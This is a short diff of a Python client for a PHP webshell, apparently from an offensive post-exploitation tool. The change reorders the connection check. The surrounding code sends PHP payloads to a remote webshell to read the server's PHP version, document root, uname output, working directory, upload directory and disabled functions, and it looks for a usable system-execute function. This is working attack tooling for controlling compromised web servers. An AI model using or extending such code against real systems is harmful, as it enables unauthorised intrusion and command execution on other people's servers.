@@ -71,11 +71,16 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         namespace="webshell",
     )
     gset("webshell.pwd", ".", namespace="webshell")
-    req = send("print('c4ca4238a0b923820d|'.phpversion().'|cc509a6f75849b');", raw=True)
-    if ('7.' in req.r_text):
+    res = send("print('c4ca4238a0b923820d|'.phpversion().'|cc509a6f75849b');", raw=True)
+    if (not res or "c4ca4238a0b923820d" not in res.r_text):
+        print(color.red("Connect failed..."))
+        if (res):
+            print(res.r_text)
+        return False
+    if ('7.' in res.r_text):
         gset("webshell.v7", True, namespace="webshell")
-    if "c4ca4238a0b923820d" in req.r_text:  # 验证是否成功连接
-        gset("webshell.php_version", req.r_text.split("c4ca4238a0b923820d|")[1].split("|cc509a6f75849b")[0], namespace="webshell")
+    if "c4ca4238a0b923820d" in res.r_text:  # 验证是否成功连接
+        gset("webshell.php_version", res.r_text.split("c4ca4238a0b923820d|")[1].split("|cc509a6f75849b")[0], namespace="webshell")
         info_req = send(
             "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.$_SERVER['SERVER_SOFTWARE'].'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions'));"
         )
@@ -119,7 +124,5 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
         if (exec_func == ''):
             print(color.red("No system execute function!\n"))
         return True
-    else:
-        print(color.red("Connect failed..."))
-        print(req.r_text)
-        return False
+
+        
